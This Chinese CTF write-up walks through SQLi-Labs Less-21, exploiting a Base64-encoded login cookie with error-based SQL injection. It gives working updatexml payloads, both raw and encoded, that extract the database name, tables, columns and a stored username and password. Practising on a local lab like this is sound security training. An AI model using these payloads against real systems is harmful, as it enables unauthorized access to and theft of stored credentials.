【SQLi-Labs】Less-21 Base64 编码 Cookie 注入 Writeup

操作者：何芊宏 | 操作日期：2026.10.25 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, Cookie注入, Base64编码, 报错注入

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-21 (Cookie Injection - Error Based - complex - string)
  • 提示：Cookie 注入，Base64 编码，报错注入

2. 解题思路与前置原理

本关卡依旧是 Cookie 维持登录状态，但与 L20 不同的是，后台使用 base64_decode() 和 base64_encode() 对 Cookie 的值进行了编码和解码处理。

因此，当我们要在 Cookie 中注入恶意 Payload 时，必须先将 Payload 进行 Base64 编码，再发送给服务器。同时，由于 HTTP 传输中 +、= 等符号可能引起解析问题，通常需要对 Base64 编码后的结果进行 URL 编码（如将 = 转为 %3D）。

通过测试得知，后台的闭合方式为单引号加括号 ')。由于行尾注释符容易被吞，最终采用 ') or updatexml(...) # 的语法构造。

3. 操作步骤与解析

第一步：抓包与识别编码

使用 admin 登录后，刷新页面并在 Burp 中抓取 GET 请求。观察请求头：
Cookie: uname=YWRtaW4%3D
YWRtaW4= 是 admin 的 Base64 编码，%3D 是 = 的 URL 编码。确认服务器期待接收 Base64 编码的数据。

第二步：构造 Payload 并进行编码

使用 Burp Suite 顶部的 解码器 (Decoder) 标签，将明文 Payload 转换为符合要求的密文。以获取库名为例：

  1. 明文 Payload： admin') or updatexml(1,concat(0x7e,(select database()),0x7e),1)#
  2. Base64 编码后： YWRtaW4nKSBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIw==
  3. URL 编码后（可选，替换等号）： YWRtaW4nKSBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIw%3D%3D

第三步：发送注入请求

在 Repeater 中，将 Cookie 替换为编码后的 Payload：

Cookie: uname=YWRtaW4nKSBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIw%3D%3D

回显现象：页面报错，黄字显示 XPATH syntax error: '~security~'。注入成功。

第四步：依次获取表名、列名与账号密码

将以下 Payload 同样使用 Decoder 进行 Base64 和 URL 编码，替换 Cookie 发送：

  • 表名：admin') or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)#
  • 列名：admin') or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1)# (注：此处未限制库名，导致查出系统表列名，属于数据污染)
  • 账号密码：admin') or updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)#

回显现象：最终成功爆出 ~Dumb:Dumb~。

4. 踩坑记录与复盘

  • 编码链的复杂性：在实战中，Cookie 被 Base64 包装很常见。我们需要在 Payload 构造 -> Base64 编码 -> URL 编码 三者之间熟练切换。
  • 注释符失效的妥协：由于 HTTP 传输对特殊字符的限制，在复杂的编码环境中，`#` 和 `--+` 常常失效。通过 `and '1'='1` 或者 `or 1=1 #` 等方式进行逻辑闭合，是应对此类环境的有效手段。
  • 数据污染：在查询 `information_schema.columns` 时，只加 `table_name` 限制会把系统自带表的列名也捞出来。标准姿势是加上 `and table_schema='security'`，精准过滤。

5. 知识点总结

  • Base64 编码注入：当遇到服务端对数据进行编码解码时，需要将 Payload 编码为服务器可识别的格式。
  • Burp 解码器：熟练使用 Burp 的 Decoder 模块进行 Base64、URL 等多重编码的来回转换，是进行复杂注入的基础技能。
